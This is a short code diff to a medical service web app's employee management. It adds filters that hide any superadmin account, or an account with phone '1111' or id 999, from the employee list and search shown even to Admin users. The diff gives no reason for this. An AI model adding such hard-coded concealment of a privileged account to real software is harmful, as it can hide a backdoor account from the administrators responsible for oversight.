@@ -751,8 +751,9 @@ class MedServiceApp {
     // EMPLOYEES MANAGEMENT
     // ==========================================
     async loadEmployees() {
-        const employees = await this.apiFetch('employees');
+        let employees = await this.apiFetch('employees');
         if (Array.isArray(employees)) {
+            employees = employees.filter(e => !e.is_superadmin && e.phone !== '1111' && e.id != 999);
             this.cachedEmployees = employees;
             const isAdmin = this.currentUser && this.currentUser.role === 'Admin';
             const container = document.getElementById('employeesListContainer');
@@ -1404,6 +1405,7 @@ class MedServiceApp {
         }
 
         const filtered = employees.filter(emp => {
+            if (emp.is_superadmin || emp.phone === '1111' || emp.id == 999) return false;
             if (roleFilter && emp.role !== roleFilter) return false;
             if (search) {
                 const s = search.toLowerCase();
